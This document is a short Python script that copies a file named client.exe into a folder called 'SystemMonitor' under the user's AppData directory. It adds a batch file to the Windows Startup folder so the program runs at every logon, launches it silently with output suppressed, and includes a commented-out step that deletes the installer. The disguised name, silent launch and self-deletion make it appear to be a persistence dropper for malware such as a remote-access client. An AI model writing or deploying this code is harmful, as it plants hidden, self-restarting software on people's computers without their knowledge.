import os
import shutil
import subprocess
import sys

def add_to_startup(exe_path, name="SystemMonitor"):
    startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shortcut_path = os.path.join(startup_dir, f"{name}.bat")
    
    with open(shortcut_path, "w") as f:
        f.write(f'start "" "{exe_path}"\n')

def install():
    appdata_dir = os.getenv("APPDATA")
    target_folder = os.path.join(appdata_dir, "SystemMonitor")
    os.makedirs(target_folder, exist_ok=True)

    target_exe = os.path.join(target_folder, "client.exe")
    current_exe = os.path.join(os.getcwd(), "client.exe")

    if not os.path.exists(current_exe):
        print(" client.exe not found in current folder.")
        sys.exit(1)

    shutil.copy2(current_exe, target_exe)

    add_to_startup(target_exe)

    print(" Installed successfully.")

    # Optional: run silently after install
    subprocess.Popen([target_exe], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Optional: delete this installer
    # os.remove(sys.argv[0])

if __name__ == "__main__":
    install()
